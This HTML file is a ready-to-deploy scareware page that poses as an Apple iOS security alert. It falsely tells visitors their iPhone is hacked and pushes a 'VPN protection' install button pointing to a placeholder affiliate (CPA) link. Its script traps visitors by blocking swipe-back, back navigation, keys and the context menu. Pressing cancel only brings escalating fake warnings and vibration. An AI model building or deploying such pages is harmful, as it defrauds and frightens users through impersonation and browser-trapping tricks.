<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Security Alert</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-touch-callout: none;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: white;
            height: 100vh;
            height: -webkit-fill-available;
            overflow: hidden;
            touch-action: none;
            position: fixed;
            width: 100%;
            -webkit-overflow-scrolling: touch;
        }
        
        .alert-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            height: -webkit-fill-available;
            background: radial-gradient(ellipse at center, #450000 0%, #000 80%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }
        
        .alert-box {
            background: linear-gradient(145deg, #6a0000 0%, #300000 100%);
            border: 2px solid #ff3b30;
            border-radius: 18px;
            padding: 25px;
            width: 100%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 0 40px rgba(255, 59, 48, 0.6);
            animation: pulse 2s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
            50% { box-shadow: 0 0 50px rgba(255, 59, 48, 0.9); }
            100% { box-shadow: 0 0 20px rgba(255, 59, 48, 0.6); }
        }
        
        .alert-icon {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 8px rgba(255, 59, 48, 0.8));
        }
        
        h1 {
            font-size: 26px;
            margin-bottom: 18px;
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.6);
            font-weight: 700;
        }
        
        p {
            margin-bottom: 22px;
            font-size: 17px;
            line-height: 1.5;
            color: #ffb3b3;
        }
        
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-top: 25px;
        }
        
        .btn {
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.15s;
            -webkit-appearance: none;
        }
        
        .btn-install {
            background: linear-gradient(to bottom, #ff3b30, #b20000);
            color: white;
            box-shadow: 0 5px 0 #800000;
            text-shadow: 0 1px 1px rgba(0,0,0,0.4);
        }
        
        .btn-install:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #800000;
        }
        
        .btn-cancel {
            background: #1c1c1e;
            color: #ff9e9e;
            border: 1px solid #ff3b30;
        }
        
        .btn-cancel:active {
            background: #2c2c2e;
        }
    </style>
</head>
<body>
    <div class="alert-container" id="alertContainer">
        <div class="alert-box">
            <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
            <h1>‚ö†Ô∏è iOS SECURITY BREACH ‚ö†Ô∏è</h1>
            <p><strong>YOUR IPHONE IS HACKED!</strong></p>
            <p>We've detected:</p>
            <p>‚Ä¢ Location tracking<br>‚Ä¢ iCloud data theft<br>‚Ä¢ Banking app infiltration</p>
            <div class="btn-group">
                <button class="btn btn-install" onclick="window.location.href='YOUR_CPA_LINK'">
                    üîí INSTALL VPN PROTECTION
                </button>
                <button class="btn btn-cancel" id="cancelBtn">
                    CANCEL (DATA AT RISK)
                </button>
            </div>
        </div>
    </div>

    <script>
        // iOS-specific trapping techniques
        let attempts = 0;
        const maxAttempts = 10;
        const cancelBtn = document.getElementById('cancelBtn');
        
        // 1. Prevent Safari swipe-to-go-back
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });
        
        // 2. Block back navigation (works in WKWebView)
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
            triggerExitAttempt();
        };
        
        // 3. iOS-specific exit attempts
        function triggerExitAttempt() {
            attempts++;
            
            const warnings = [
                "APPLE SECURITY ALERT: Your iPhone is compromised!",
                "WARNING: Hackers are accessing your iCloud!",
                "URGENT: Apple Pay credentials being stolen!",
                "EMERGENCY: Photos and contacts exposed!",
                "CRITICAL: Banking apps under attack!",
                "FINAL WARNING: Complete device takeover!",
                "LAST CHANCE: Install protection now!",
                "IMMEDIATE ACTION REQUIRED!",
                "THIS IS YOUR FINAL ALERT!",
                "REDIRECTING TO SAFETY..."
            ];
            
            // iOS-compatible vibration (works in some browsers)
            if (navigator.vibrate || navigator.webkitVibrate) {
                (navigator.vibrate || navigator.webkitVibrate)([200,100,200,100,200]);
            }
            
            // Shake animation that works on iOS
            const alertBox = document.querySelector('.alert-box');
            alertBox.style.transform = 'translateX(-10px)';
            setTimeout(() => { alertBox.style.transform = 'translateX(10px)'; }, 50);
            setTimeout(() => { alertBox.style.transform = 'translateX(-10px)'; }, 100);
            setTimeout(() => { alertBox.style.transform = 'translateX(10px)'; }, 150);
            setTimeout(() => { alertBox.style.transform = 'translateX(0)'; }, 200);
            
            // Show alert
            if (attempts < maxAttempts) {
                alert(warnings[attempts-1]);
            } else {
                window.location.href = "about:blank";
            }
        }
        
        // 4. Cancel button handler
        cancelBtn.addEventListener('click', triggerExitAttempt);
        
        // 5. Prevent new tab opening
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Tab' || e.metaKey) {
                e.preventDefault();
            }
        });
        
        // 6. iOS-specific context menu block
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
    </script>
</body>
</html>
